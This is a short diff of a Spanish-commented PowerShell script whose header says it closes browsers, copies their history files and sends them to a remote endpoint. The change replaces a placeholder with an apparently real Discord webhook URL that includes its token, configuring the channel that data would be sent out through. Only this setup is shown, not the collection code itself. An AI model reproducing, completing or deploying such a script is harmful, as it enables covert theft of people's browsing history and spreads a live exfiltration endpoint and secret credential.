@@ -12,7 +12,7 @@ Cierra navegadores, copia sus archivos de historial y envía los resultados a un
 #>
 
 # Configuración del Webhook de Discord
-$discordWebhookUrl = "https://discord.com/api/webhooks/TU_WEBHOOK_AQUI"
+$discordWebhookUrl = "https://discord.com/api/webhooks/1348379829598163038/BBTDV8jHgoMyF4sNPi2L_IyAZSsbmrtyuhE7VCAMiT0PVuTPTF-_OqDkWjPfDvC5YBkP"
 
 function Initialize-BackupEnvironment {
     <#
